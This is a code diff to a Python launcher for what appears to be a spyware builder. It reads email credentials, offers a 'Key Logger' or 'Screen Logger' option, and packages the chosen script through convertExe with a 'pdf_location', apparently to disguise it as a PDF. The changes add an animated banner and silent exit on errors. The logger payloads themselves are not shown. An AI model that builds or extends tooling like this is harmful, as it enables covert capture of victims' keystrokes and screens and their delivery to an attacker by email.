@@ -2,17 +2,21 @@ import os
 import convertExe
 import sys
 from colorama import init, Fore, Style
+import time
 
 def display_logo():
     init()  # Initialize colorama
-    logo = f"""
-    {Fore.RED}#####   #####  #    # 
-    {Fore.GREEN}#    #  #    # ##   # 
-    {Fore.YELLOW}#####   #####  # #  # 
-    {Fore.BLUE}#   #   #      #  # # 
-    {Fore.MAGENTA}#    #  #      #   ## {Style.RESET_ALL}
-    """
-    print(logo)
+    logo_lines = [
+        f"{Fore.RED}#####   #####  #    # ",
+        f"{Fore.GREEN}#    #  #    # ##   # ",
+        f"{Fore.YELLOW}#####   #####  # #  # ",
+        f"{Fore.BLUE}#   #   #      #  # # ",
+        f"{Fore.MAGENTA}#    #  #      #   ## {Style.RESET_ALL}"
+    ]
+
+    for line in logo_lines:
+        print(line)
+        time.sleep(0.5)  # Add delay for animation effect
 
 def get_credentials():
     credentials_file = "credentials.txt"
@@ -40,24 +44,28 @@ def get_credentials():
     return send_mail, password, receiver_mail, int(interval), pdf_location
 
 def main():
-    display_logo()
-    send_mail, password, receiver_mail, interval, pdf_location = get_credentials()
-    
-    print("Choose a tool:")
-    print("1) Screen Logger")
-    print("2) Key Logger")
-    print("3) EXIT")
-    choice = input("[+] Enter your choice (1/2): ").strip()
+    try:
+        display_logo()
+        send_mail, password, receiver_mail, interval, pdf_location = get_credentials()
+        
+        print("Choose a tool:")
+        print("1) Screen Logger")
+        print("2) Key Logger")
+        print("3) EXIT")
+        choice = input("[+] Enter your choice (1/2): ").strip()
 
-    if choice == "1":
-        # Call ScreenLogger functionality here
-        convertExe.convert_exe_to_format("aScreenlogger.py", "screenlogger", pdf_location)
+        if choice == "1":
+            # Call ScreenLogger functionality here
+            convertExe.convert_exe_to_format("aScreenlogger.py", "screenlogger", pdf_location)
 
-    elif choice == "2":
-        convertExe.convert_exe_to_format("akeylogger.py", "keylogger", pdf_location)
-        print("[+] Key Logger selected.")
-        # Call KeyLogger functionality here
-    else:
+        elif choice == "2":
+            convertExe.convert_exe_to_format("akeylogger.py", "keylogger", pdf_location)
+            print("[+] Key Logger selected.")
+            # Call KeyLogger functionality here
+        else:
+            exit()
+    except Exception:
+        # Exit the program silently on any exception
         exit()
 
 if __name__ == "__main__":
